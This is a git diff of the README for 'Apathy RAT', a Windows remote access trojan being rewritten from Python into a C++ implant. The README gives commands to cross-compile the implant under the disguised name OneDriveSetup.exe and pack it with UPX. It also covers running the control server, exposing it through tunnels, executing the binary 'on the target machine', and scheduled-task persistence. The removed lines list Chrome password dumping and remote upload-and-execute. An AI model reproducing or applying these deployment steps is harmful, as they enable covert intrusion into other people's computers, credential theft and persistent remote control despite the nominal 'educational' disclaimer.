@@ -1,39 +1,47 @@
-# Apathy RAT with Backdoor
+# Apathy RAT
 
-Remote Access Tool with AES encryption, web interface, screenshot streaming, token dumping and scheduled task persistence.
+Windows implant written in pure C++ with web control panel.
 
 ## Features
 
-- AES encrypted communication
-- Web control panel
-- Screenshot + auto stream
-- Chrome password dump (DPAPI)
-- Remote shell
-- File upload & execute
+- Pure C++ (no Python runtime)
+- AES encryption via Windows CryptoAPI
+- Reverse TCP connect with auto-reconnect
+- Random startup delay (30-180 seconds)
+- Remote shell execution
 - Scheduled Task persistence
-- Delayed connect + reconnect
+- Screenshot via GDI
 - Single instance mutex
 - No console window
+- Web-based control panel
 
 ## Requirements
 
-### Server (Linux)
+### Build machine (Kali / Linux)
+- g++-mingw-w64
+- upx (optional)
+
+### Server
 - Python 3.8+
 - flask
 - cryptography
 
-### Client build (Kali / Linux)
-- Nuitka
-- mingw-w64
-- pillow
-- cryptography
-- upx (optional)
+## Build Implant
 
-## Installation
+Edit `HOST` in `implant.cpp` before compiling.
 
-### Server
+```bash
+sudo apt update
+sudo apt install -y gcc-mingw-w64 upx-ucl
 
-Create virtual environment and install dependencies:
+x86_64-w64-mingw32-g++ implant.cpp -o OneDriveSetup.exe \
+  -static -s -O2 -mwindows \
+  -lws2_32 -lcrypt32 -lgdi32 -luser32
+
+upx --best --lzma OneDriveSetup.exe
+```
+
+## Server Setup
 
 ```bash
 python3 -m venv venv
@@ -42,105 +50,53 @@ pip install flask cryptography
 python3 server.py
 ```
 
-Open http://0.0.0.0:5000
+Open in browser: `http://0.0.0.0:5000`
 
-### Client
-
-1. Create virtual environment (optional but recommended):
-
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
-
-2. Edit `client.py` and set your IP:
-
-```python
-HOST = "YOUR_IP"
-```
-
-#### How to get IP
+## How to get IP
 
 Local IP (same network):
 ```bash
-ip a | grep inet
-# or
 hostname -I
+# or
+ip a | grep inet
 ```
-Example: `172.20.10.5` or `192.168.1.100`
 
-External IP (internet):
+External IP:
 ```bash
 curl ifconfig.me
-# or
-curl icanhazip.com
-```
-Example: `95.82.118.174`
-
-Use local IP if target is on the same network.  
-Use external IP only if you have port forwarding or VPS.  
-For most cases behind NAT use a tunnel (ngrok / playit).
-
-3. Install build tools:
-
-```bash
-sudo apt install -y gcc-mingw-w64
-sudo apt install -y patchelf
-pip install nuitka pillow cryptography ordered-set zstandard
 ```
 
-4. Build with Nuitka:
-
-```bash
-nuitka \
-  --onefile \
-  --windows-disable-console \
-  --mingw64 \
-  --lto=yes \
-  --remove-output \
-  --no-pyi-file \
-  --include-module=PIL \
-  --include-package=cryptography \
-  --output-filename=OneDriveSetup.exe \
-  client.py
-```
-
-5. Optional packing:
-```bash
-upx --best --lzma OneDriveSetup.exe
-```
+- Same network → use local IP
+- Internet → use external IP + port forward, or better use a tunnel (ngrok / playit.gg)
 
 ## Usage
 
-1. Start server (`python3 server.py`)
-2. Run the generated exe on target
-3. Client appears in web panel after 30-180 seconds
-4. Select client and use controls
+1. Set correct `HOST` in `implant.cpp` and build
+2. Start the server
+3. Execute `OneDriveSetup.exe` on the target machine
+4. Wait 30–180 seconds for the client to appear in the web panel
+5. Select the client and use available functions
 
-### Commands in web
+### Available actions
 
-- stream — auto screenshot every 700ms
-- shot — single screenshot
-- tokens — dump Chrome saved passwords
-- persist — create scheduled task
-- shell — execute command
-- upload+run — upload file and execute
+- Shell command execution
+- Persistence (Scheduled Task)
+- Screenshot
+- Client information
 
 ## Network
 
-- Default port: 4444
-- Same network: use local IP from `hostname -I`
-- Internet: use external IP from `curl ifconfig.me` + port forward, or tunnel
-- Recommended tunnels: ngrok tcp 4444 or playit.gg
+- Default listening port: `4444`
+- Client automatically reconnects on disconnect
+- Recommended to change port and AES key for each deployment
 
 ## Notes
 
-- Persistence is manual (only after `persist` command)
-- Client reconnects automatically
-- Change AES key in both files for production use
-- Built binary has no console and uses mutex
-- Virtual environment isolates dependencies
+- Persistence is not applied automatically — only on explicit command
+- Binary is compiled with `-mwindows` (no console)
+- Uses mutex to prevent multiple instances
+- For internet use prefer a TCP tunnel instead of direct port forwarding
 
 ## Disclaimer
 
-For educational and authorized testing only.
+This tool is provided for educational purposes and authorized security testing only. Unauthorized use is prohibited.
